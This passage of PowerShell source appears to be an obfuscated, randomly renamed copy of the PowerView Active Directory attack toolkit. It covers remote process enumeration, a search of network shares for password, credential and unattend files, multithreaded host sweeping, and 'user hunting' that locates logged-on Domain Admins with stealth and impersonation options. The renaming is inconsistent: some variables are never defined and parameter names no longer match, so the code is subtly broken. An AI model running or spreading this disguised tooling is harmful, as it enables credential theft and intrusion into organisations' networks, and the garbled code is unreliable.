                                $A | Add-Member Noteproperty 'DriveLetter' $9fxArYSf9LAG36tuVOghn7
                                $A | Add-Member Noteproperty 'ProviderName' $nRhCNH7SkXlDKbA
                                $A | Add-Member Noteproperty 'RemotePath' $PQVWqPQthC93I6
                                $A | Add-Member Noteproperty 'DriveUserName' $APeAKkxr
                                $A.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')
                                $A
                            }
                        }
                    }
                    catch {
                        Write-Verbose "[Get-WMIRegMountedDrive] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[Get-WMIRegMountedDrive] Error accessing $TfIJKo1L, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}


function Get-WMIProcess {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $mA = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($TfIJKo1L in $mA) {
            try {
                $m4PiGHAzU = @{
                    'ComputerName' = $mA
                    'Class' = 'Win32_process'
                }
                if ($PSBoundParameters['Credential']) { $m4PiGHAzU['Credential'] = $3ezVSfm6f4k }
                Get-WMIobject @WmiArguments | ForEach-Object {
                    $qhixLDHPA3f = $_.getowner();
                    $2f9FjDCRdN8Jo = New-Object PSObject
                    $2f9FjDCRdN8Jo | Add-Member Noteproperty 'ComputerName' $TfIJKo1L
                    $2f9FjDCRdN8Jo | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                    $2f9FjDCRdN8Jo | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                    $2f9FjDCRdN8Jo | Add-Member Noteproperty 'Domain' $qhixLDHPA3f.Domain
                    $2f9FjDCRdN8Jo | Add-Member Noteproperty 'User' $qhixLDHPA3f.User
                    $2f9FjDCRdN8Jo.PSObject.TypeNames.Insert(0, 'PowerView.UserProcess')
                    $2f9FjDCRdN8Jo
                }
            }
            catch {
                Write-Verbose "[Get-WMIProcess] Error enumerating remote processes on '$TfIJKo1L', access likely denied: $_"
            }
        }
    }
}


function Find-InterestingFile {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $a9LvymtQdGPNr8cqgsI = '.\',

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $U6UrtLBeH9FHrhjE9C = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $yXpw97L6JEbxQ1t409Rk,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $WntZ3jV2Q7IKgNc4mhuvp,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $5dN69gEBTpy2AfnVaqDR,

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $lsnufEMYrbDoLkH6G,

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $Hq5puV8FBR4ik3ZX9yg,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $BANq,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $SPF9H8A01Gx53zjIlgTCvipL,

        [Switch]
        $KOlcj5SPXmgzkWFpYA0w,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $wtWPex5R =  @{
            'Recurse' = $True
            'ErrorAction' = 'SilentlyContinue'
            'Include' = $U6UrtLBeH9FHrhjE9C
        }
        if ($PSBoundParameters['OfficeDocs']) {
            $wtWPex5R['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }
        elseif ($PSBoundParameters['FreshEXEs']) {
            
            $yXpw97L6JEbxQ1t409Rk = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
            $wtWPex5R['Include'] = @('*.exe')
        }
        $wtWPex5R['Force'] = -not $PSBoundParameters['ExcludeHidden']

        $vF = @{}

        function Test-Write {
            
            [CmdletBinding()]Param([String]$a9LvymtQdGPNr8cqgsI)
            try {
                $toLgdlE9fc0rqR = [IO.File]::OpenWrite($a9LvymtQdGPNr8cqgsI)
                $toLgdlE9fc0rqR.Close()
                $True
            }
            catch {
                $False
            }
        }
    }

    PROCESS {
        ForEach ($XhfGVE in $a9LvymtQdGPNr8cqgsI) {
            if (($XhfGVE -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $7GPfL6B = (New-Object System.Uri($XhfGVE)).Host
                if (-not $vF[$7GPfL6B]) {
                    
                    Add-RemoteConnection -mA $7GPfL6B -3ezVSfm6f4k $3ezVSfm6f4k
                    $vF[$7GPfL6B] = $True
                }
            }

            $wtWPex5R['Path'] = $XhfGVE
            Get-ChildItem @SearcherArguments | ForEach-Object {
                
                $On5CLdy2vUBu = $True
                if ($PSBoundParameters['ExcludeFolders'] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName)"
                    $On5CLdy2vUBu = $False
                }
                if ($yXpw97L6JEbxQ1t409Rk -and ($_.LastAccessTime -lt $yXpw97L6JEbxQ1t409Rk)) {
                    $On5CLdy2vUBu = $False
                }
                if ($PSBoundParameters['LastWriteTime'] -and ($_.LastWriteTime -lt $WntZ3jV2Q7IKgNc4mhuvp)) {
                    $On5CLdy2vUBu = $False
                }
                if ($PSBoundParameters['CreationTime'] -and ($_.CreationTime -lt $5dN69gEBTpy2AfnVaqDR)) {
                    $On5CLdy2vUBu = $False
                }
                if ($PSBoundParameters['CheckWriteAccess'] -and (-not (Test-Write -a9LvymtQdGPNr8cqgsI $_.FullName))) {
                    $On5CLdy2vUBu = $False
                }
                if ($On5CLdy2vUBu) {
                    $OAxI43ialmGHvyn = @{
                        'Path' = $_.FullName
                        'Owner' = $((Get-Acl $_.FullName).Owner)
                        'LastAccessTime' = $_.LastAccessTime
                        'LastWriteTime' = $_.LastWriteTime
                        'CreationTime' = $_.CreationTime
                        'Length' = $_.Length
                    }
                    $JIovyYSfK1ED5NeqTrMHZ = New-Object -TypeName PSObject -Property $OAxI43ialmGHvyn
                    $JIovyYSfK1ED5NeqTrMHZ.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
                    $JIovyYSfK1ED5NeqTrMHZ
                }
            }
        }
    }

    END {
        
        $vF.Keys | Remove-RemoteConnection
    }
}








function New-ThreadedFunction {
    
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        $mA,

        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        $B9xLvD7bQtqi2f,

        [Parameter(Position = 2)]
        [Hashtable]
        $gKTXceZz5GOa96OV3KzamaXbT,

        [Int]
        [ValidateRange(1,  100)]
        $JcIMRzC5Kitl = 20,

        [Switch]
        $EUnz
    )

    BEGIN {
        
        
        $ks6R = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()

        
        
        $ks6R.ApartmentState = [System.Threading.ApartmentState]::STA

        
        
        if (-not $EUnz) {
            
            $QlLqgALAE0IyiFfO = Get-Variable -Scope 2

            
            $qd1k0HLFxxZDuqW9Gx6fE4wck = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')

            
            ForEach ($qbUnQJBZzOFYy9 in $QlLqgALAE0IyiFfO) {
                if ($qd1k0HLFxxZDuqW9Gx6fE4wck -NotContains $qbUnQJBZzOFYy9.Name) {
                $ks6R.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $qbUnQJBZzOFYy9.name,$qbUnQJBZzOFYy9.Value,$qbUnQJBZzOFYy9.description,$qbUnQJBZzOFYy9.options,$qbUnQJBZzOFYy9.attributes))
                }
            }

            
            ForEach ($7ZtJ in (Get-ChildItem Function:)) {
                $ks6R.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $7ZtJ.Name, $7ZtJ.Definition))
            }
        }

        
        
        

        
        $rk = [RunspaceFactory]::CreateRunspacePool(1, $JcIMRzC5Kitl, $ks6R, $Host)
        $rk.Open()

        
        $b07KAXTqvUWxSfk = $qYFR5PCZruUkdna9T
        ForEach ($nBrLzVtwEXf1GcWKHFbA in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
            $LPbIJYKDo6VnMysTivA = $nBrLzVtwEXf1GcWKHFbA.GetParameters()
            if (($LPbIJYKDo6VnMysTivA.Count -eq 2) -and $LPbIJYKDo6VnMysTivA[0].Name -eq 'input' -and $LPbIJYKDo6VnMysTivA[1].Name -eq 'output') {
                $b07KAXTqvUWxSfk = $nBrLzVtwEXf1GcWKHFbA.MakeGenericMethod([Object], [Object])
                break
            }
        }

        $w7ISH9ylBe2tDX45 = @()
        $mA = $mA | Where-Object {$_ -and $_.Trim()}
        Write-Verbose "[New-ThreadedFunction] Total number of hosts: $($mA.count)"

        
        if ($JcIMRzC5Kitl -ge $mA.Length) {
            $JcIMRzC5Kitl = $mA.Length
        }
        $S = [Int]($mA.Length/$JcIMRzC5Kitl)
        $fqXriR = @()
        $NLgmWL5eoZJopeOMY0cU = 0
        $tsEvLWalmkDSUxnl2looWXPB = $S

        for($RGKU3QpH = 1; $RGKU3QpH -le $JcIMRzC5Kitl; $RGKU3QpH++) {
            $lxTeSdB = New-Object System.Collections.ArrayList
            if ($RGKU3QpH -eq $JcIMRzC5Kitl) {
                $tsEvLWalmkDSUxnl2looWXPB = $mA.Length
            }
            $lxTeSdB.AddRange($mA[$NLgmWL5eoZJopeOMY0cU..($tsEvLWalmkDSUxnl2looWXPB-1)])
            $NLgmWL5eoZJopeOMY0cU += $S
            $tsEvLWalmkDSUxnl2looWXPB += $S
            $fqXriR += @(,@($lxTeSdB.ToArray()))
        }

        Write-Verbose "[New-ThreadedFunction] Total number of threads/partitions: $JcIMRzC5Kitl"

        ForEach ($r48Kc22tQIVc in $fqXriR) {
            
            $IVj0TDlcdxZWt6edDvgb2 = [PowerShell]::Create()
            $IVj0TDlcdxZWt6edDvgb2.runspacepool = $rk

            
            $qYFR5PCZruUkdna9T = $IVj0TDlcdxZWt6edDvgb2.AddScript($B9xLvD7bQtqi2f).AddParameter('ComputerName', $r48Kc22tQIVc)
            if ($gKTXceZz5GOa96OV3KzamaXbT) {
                ForEach ($xBQFyJ5wIfP1Ceu in $gKTXceZz5GOa96OV3KzamaXbT.GetEnumerator()) {
                    $qYFR5PCZruUkdna9T = $IVj0TDlcdxZWt6edDvgb2.AddParameter($xBQFyJ5wIfP1Ceu.Name, $xBQFyJ5wIfP1Ceu.Value)
                }
            }

            
            $HLkP8yYwFiBnjz2lL = New-Object Management.Automation.PSDataCollection[Object]

            
            $w7ISH9ylBe2tDX45 += @{
                PS = $IVj0TDlcdxZWt6edDvgb2
                Output = $HLkP8yYwFiBnjz2lL
                Result = $b07KAXTqvUWxSfk.Invoke($IVj0TDlcdxZWt6edDvgb2, @($qYFR5PCZruUkdna9T, [Management.Automation.PSDataCollection[Object]]$HLkP8yYwFiBnjz2lL))
            }
        }
    }

    END {
        Write-Verbose "[New-ThreadedFunction] Threads executing"

        
        Do {
            ForEach ($kadoz in $w7ISH9ylBe2tDX45) {
                $kadoz.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While (($w7ISH9ylBe2tDX45 | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)

        $EDNCT4T5emMst = 100
        Write-Verbose "[New-ThreadedFunction] Waiting $EDNCT4T5emMst seconds for final cleanup..."

        
        for ($RGKU3QpH=0; $RGKU3QpH -lt $EDNCT4T5emMst; $RGKU3QpH++) {
            ForEach ($kadoz in $w7ISH9ylBe2tDX45) {
                $kadoz.Output.ReadAll()
                $kadoz.PS.Dispose()
            }
            Start-Sleep -S 1
        }

        $rk.Dispose()
        Write-Verbose "[New-ThreadedFunction] all threads completed"
    }
}


function Find-DomainUserLocation {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $mA,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [String]
        $hm9FLfR3U5b,

        [ValidateNotNullOrEmpty()]
        [String]
        $DyvdAEbkrnqStxLz0wmTgV9Kc,

        [ValidateNotNullOrEmpty()]
        [String]
        $xrToHFMttDhJiKTDH2QzEmKol,

        [Alias('Unconstrained')]
        [Switch]
        $KBM1AGhz05RscnjU,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $hv47qcP,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $9s,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $g5wRdT3IbUS2zkc,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tHSPwRinjZ69gl0v5fMEQU,

        [ValidateNotNullOrEmpty()]
        [String]
        $hZmS,

        [ValidateNotNullOrEmpty()]
        [String]
        $XguMCq,

        [ValidateNotNullOrEmpty()]
        [String]
        $BLrktsm69gaeEYvXp1jZ0,

        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $Edi4yY = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        $ZC1v3RySBXFbIACqXTCyUXQ,

        [Alias('AllowDelegation')]
        [Switch]
        $2Pzv0LryJg96S1J,

        [Switch]
        $5jmN,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $4A4Oqrnq,

        [ValidateRange(1, 10000)]
        [Int]
        $BLzXIZ = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $ihajtIg = .3,

        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        $p951fm5Wc0SxsiFOmVMvL,

        [Switch]
        $W5ad726eNyS4b,

        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        $z5GlrQZ7oMywmcEPb = 'All',

        [Int]
        [ValidateRange(1, 100)]
        $JcIMRzC5Kitl = 20
    )

    BEGIN {

        $fYHM6rC1lTm = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $fYHM6rC1lTm['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['ComputerDomain']) { $fYHM6rC1lTm['Domain'] = $hm9FLfR3U5b }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $fYHM6rC1lTm['LDAPFilter'] = $DyvdAEbkrnqStxLz0wmTgV9Kc }
        if ($PSBoundParameters['ComputerSearchBase']) { $fYHM6rC1lTm['SearchBase'] = $xrToHFMttDhJiKTDH2QzEmKol }
        if ($PSBoundParameters['Unconstrained']) { $fYHM6rC1lTm['Unconstrained'] = $eXoNv092dGwM1UuRD }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $fYHM6rC1lTm['OperatingSystem'] = $c5fth3UNK }
        if ($PSBoundParameters['ComputerServicePack']) { $fYHM6rC1lTm['ServicePack'] = $txAlgojF79hMWarPfHVYk }
        if ($PSBoundParameters['ComputerSiteName']) { $fYHM6rC1lTm['SiteName'] = $M6Sb30DA }
        if ($PSBoundParameters['Server']) { $fYHM6rC1lTm['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $fYHM6rC1lTm['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $fYHM6rC1lTm['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $fYHM6rC1lTm['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $fYHM6rC1lTm['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $fYHM6rC1lTm['Credential'] = $3ezVSfm6f4k }

        $ogjQd7VXw4PS0fCM5yLTDnlcY = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['Identity'] = $tHSPwRinjZ69gl0v5fMEQU }
        if ($PSBoundParameters['Domain']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['UserDomain']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['Domain'] = $hZmS }
        if ($PSBoundParameters['UserLDAPFilter']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['LDAPFilter'] = $XguMCq }
        if ($PSBoundParameters['UserSearchBase']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['SearchBase'] = $BLrktsm69gaeEYvXp1jZ0 }
        if ($PSBoundParameters['UserAdminCount']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['AdminCount'] = $ZC1v3RySBXFbIACqXTCyUXQ }
        if ($PSBoundParameters['UserAllowDelegation']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['AllowDelegation'] = $2Pzv0LryJg96S1J }
        if ($PSBoundParameters['Server']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['Credential'] = $3ezVSfm6f4k }

        $IolOzRrjd13cuX6HE = @()

        
        if ($PSBoundParameters['ComputerName']) {
            $IolOzRrjd13cuX6HE = @($mA)
        }
        else {
            if ($PSBoundParameters['Stealth']) {
                Write-Verbose "[Find-DomainUserLocation] Stealth enumeration using source: $z5GlrQZ7oMywmcEPb"
                $maYHlD5B2O0mLzoOq808NW8uZ = New-Object System.Collections.ArrayList

                if ($z5GlrQZ7oMywmcEPb -match 'File|All') {
                    Write-Verbose '[Find-DomainUserLocation] Querying for file servers'
                    $IvlPQTJ8pkzjtnZ6NC7a39 = @{}
                    if ($PSBoundParameters['Domain']) { $IvlPQTJ8pkzjtnZ6NC7a39['Domain'] = $3Ecdwi8qNy }
                    if ($PSBoundParameters['ComputerDomain']) { $IvlPQTJ8pkzjtnZ6NC7a39['Domain'] = $hm9FLfR3U5b }
                    if ($PSBoundParameters['ComputerSearchBase']) { $IvlPQTJ8pkzjtnZ6NC7a39['SearchBase'] = $xrToHFMttDhJiKTDH2QzEmKol }
                    if ($PSBoundParameters['Server']) { $IvlPQTJ8pkzjtnZ6NC7a39['Server'] = $Gkd0Hz5f }
                    if ($PSBoundParameters['SearchScope']) { $IvlPQTJ8pkzjtnZ6NC7a39['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
                    if ($PSBoundParameters['ResultPageSize']) { $IvlPQTJ8pkzjtnZ6NC7a39['ResultPageSize'] = $dTP7Qv6RslNUx }
                    if ($PSBoundParameters['ServerTimeLimit']) { $IvlPQTJ8pkzjtnZ6NC7a39['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
                    if ($PSBoundParameters['Tombstone']) { $IvlPQTJ8pkzjtnZ6NC7a39['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
                    if ($PSBoundParameters['Credential']) { $IvlPQTJ8pkzjtnZ6NC7a39['Credential'] = $3ezVSfm6f4k }
                    $6Va2Ltey4ODgT3 = Get-DomainFileServer @FileServerSearcherArguments
                    if ($6Va2Ltey4ODgT3 -isnot [System.Array]) { $6Va2Ltey4ODgT3 = @($6Va2Ltey4ODgT3) }
                    $maYHlD5B2O0mLzoOq808NW8uZ.AddRange( $6Va2Ltey4ODgT3 )
                }
                if ($z5GlrQZ7oMywmcEPb -match 'DFS|All') {
                    Write-Verbose '[Find-DomainUserLocation] Querying for DFS servers'
                    
                    
                }
                if ($z5GlrQZ7oMywmcEPb -match 'DC|All') {
                    Write-Verbose '[Find-DomainUserLocation] Querying for domain controllers'
                    $DCSearcherArgumentsrG = @{
                        'LDAP' = $True
                    }
                    if ($PSBoundParameters['Domain']) { $DCSearcherArgumentsrG['Domain'] = $3Ecdwi8qNy }
                    if ($PSBoundParameters['ComputerDomain']) { $DCSearcherArgumentsrG['Domain'] = $hm9FLfR3U5b }
                    if ($PSBoundParameters['Server']) { $DCSearcherArgumentsrG['Server'] = $Gkd0Hz5f }
                    if ($PSBoundParameters['Credential']) { $DCSearcherArgumentsrG['Credential'] = $3ezVSfm6f4k }
                    $qZxaH05 = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                    if ($qZxaH05 -isnot [System.Array]) { $qZxaH05 = @($qZxaH05) }
                    $maYHlD5B2O0mLzoOq808NW8uZ.AddRange( $qZxaH05 )
                }
                $IolOzRrjd13cuX6HE = $maYHlD5B2O0mLzoOq808NW8uZ.ToArray()
            }
            else {
                Write-Verbose '[Find-DomainUserLocation] Querying for all computers in the domain'
                $IolOzRrjd13cuX6HE = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $($IolOzRrjd13cuX6HE.Length)"
        if ($IolOzRrjd13cuX6HE.Length -eq 0) {
            throw '[Find-DomainUserLocation] No hosts found to enumerate'
        }

        
        if ($PSBoundParameters['Credential']) {
            $iClcO = $3ezVSfm6f4k.GetNetworkCredential().UserName
        }
        else {
            $iClcO = ([Environment]::UserName).ToLower()
        }

        
        if ($PSBoundParameters['ShowAll']) {
            $zIncrjedPYEVw86obgSX = @()
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $zIncrjedPYEVw86obgSX = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $Hd3F1E = @{
                'Identity' = $Edi4yY
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $Hd3F1E['Domain'] = $hZmS }
            if ($PSBoundParameters['UserSearchBase']) { $Hd3F1E['SearchBase'] = $BLrktsm69gaeEYvXp1jZ0 }
            if ($PSBoundParameters['Server']) { $Hd3F1E['Server'] = $Gkd0Hz5f }
            if ($PSBoundParameters['SearchScope']) { $Hd3F1E['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
            if ($PSBoundParameters['ResultPageSize']) { $Hd3F1E['ResultPageSize'] = $dTP7Qv6RslNUx }
            if ($PSBoundParameters['ServerTimeLimit']) { $Hd3F1E['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
            if ($PSBoundParameters['Tombstone']) { $Hd3F1E['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
            if ($PSBoundParameters['Credential']) { $Hd3F1E['Credential'] = $3ezVSfm6f4k }
            $zIncrjedPYEVw86obgSX = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        Write-Verbose "[Find-DomainUserLocation] TargetUsers length: $($zIncrjedPYEVw86obgSX.Length)"
        if ((-not $p951fm5Wc0SxsiFOmVMvL) -and ($zIncrjedPYEVw86obgSX.Length -eq 0)) {
            throw '[Find-DomainUserLocation] No users found to target'
        }

        
        $p1gY8tCQOFWmJ0zubMcak2 = {
            Param($mA, $zIncrjedPYEVw86obgSX, $iClcO, $W5ad726eNyS4b, $5)

            if ($5) {
                
                $qYFR5PCZruUkdna9T = Invoke-UserImpersonation -5 $5 -N1xWHfZFbIiRSwgEOjKdtk
            }

            ForEach ($ftzgP9UbIARn26koF3CEKXm in $mA) {
                $4zYXe6sFagylcbNCipAf = Test-Connection -Count 1 -N1xWHfZFbIiRSwgEOjKdtk -mA $ftzgP9UbIARn26koF3CEKXm
                if ($4zYXe6sFagylcbNCipAf) {
                    $kYorROJKTgNtbBC4FyAL = Get-NetSession -mA $ftzgP9UbIARn26koF3CEKXm
                    ForEach ($l529BE76FpyXrkI in $kYorROJKTgNtbBC4FyAL) {
                        $mOi9D = $l529BE76FpyXrkI.UserName
                        $C3W0xLU8Pe15yr = $l529BE76FpyXrkI.CName

                        if ($C3W0xLU8Pe15yr -and $C3W0xLU8Pe15yr.StartsWith('\\')) {
                            $C3W0xLU8Pe15yr = $C3W0xLU8Pe15yr.TrimStart('\')
                        }

                        
                        if (($mOi9D) -and ($mOi9D.Trim() -ne '') -and ($mOi9D -notmatch $iClcO) -and ($mOi9D -notmatch '\$$')) {

                            if ( (-not $zIncrjedPYEVw86obgSX) -or ($zIncrjedPYEVw86obgSX -contains $mOi9D)) {
                                $W = New-Object PSObject
                                $W | Add-Member Noteproperty 'UserDomain' $qYFR5PCZruUkdna9T
                                $W | Add-Member Noteproperty 'UserName' $mOi9D
                                $W | Add-Member Noteproperty 'ComputerName' $ftzgP9UbIARn26koF3CEKXm
                                $W | Add-Member Noteproperty 'SessionFrom' $C3W0xLU8Pe15yr

                                
                                try {
                                    $kdRPMcYNaj5hmrI = [System.Net.Dns]::GetHostEntry($C3W0xLU8Pe15yr) | Select-Object -ExpandProperty HostName
                                    $W | Add-Member NoteProperty 'SessionFromName' $kdRPMcYNaj5hmrI
                                }
                                catch {
                                    $W | Add-Member NoteProperty 'SessionFromName' $qYFR5PCZruUkdna9T
                                }

                                
                                if ($5jmN) {
                                    $rCDKol0ecQa4 = (Test-AdminAccess -mA $C3W0xLU8Pe15yr).IsAdmin
                                    $W | Add-Member Noteproperty 'LocalAdmin' $rCDKol0ecQa4.IsAdmin
                                }
                                else {
                                    $W | Add-Member Noteproperty 'LocalAdmin' $qYFR5PCZruUkdna9T
                                }
                                $W.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                $W
                            }
                        }
                    }
                    if (-not $W5ad726eNyS4b) {
                        
                        $2e3BP7WOnIarsMCNUHlgq5 = Get-NetLoggedon -mA $ftzgP9UbIARn26koF3CEKXm
                        ForEach ($JdyVW2BmJzGuYVvoHvD in $2e3BP7WOnIarsMCNUHlgq5) {
                            $mOi9D = $JdyVW2BmJzGuYVvoHvD.UserName
                            $hZmS = $JdyVW2BmJzGuYVvoHvD.LogonDomain

                            
                            if (($mOi9D) -and ($mOi9D.trim() -ne '')) {
                                if ( (-not $zIncrjedPYEVw86obgSX) -or ($zIncrjedPYEVw86obgSX -contains $mOi9D) -and ($mOi9D -notmatch '\$$')) {
                                    $k4HcYJqy3V0FRNTtEXW = @(Resolve-IPAddress -mA $ftzgP9UbIARn26koF3CEKXm)[0].IPAddress
                                    $W = New-Object PSObject
                                    $W | Add-Member Noteproperty 'UserDomain' $hZmS
                                    $W | Add-Member Noteproperty 'UserName' $mOi9D
                                    $W | Add-Member Noteproperty 'ComputerName' $ftzgP9UbIARn26koF3CEKXm
                                    $W | Add-Member Noteproperty 'IPAddress' $k4HcYJqy3V0FRNTtEXW
                                    $W | Add-Member Noteproperty 'SessionFrom' $qYFR5PCZruUkdna9T
                                    $W | Add-Member Noteproperty 'SessionFromName' $qYFR5PCZruUkdna9T

                                    
                                    if ($5jmN) {
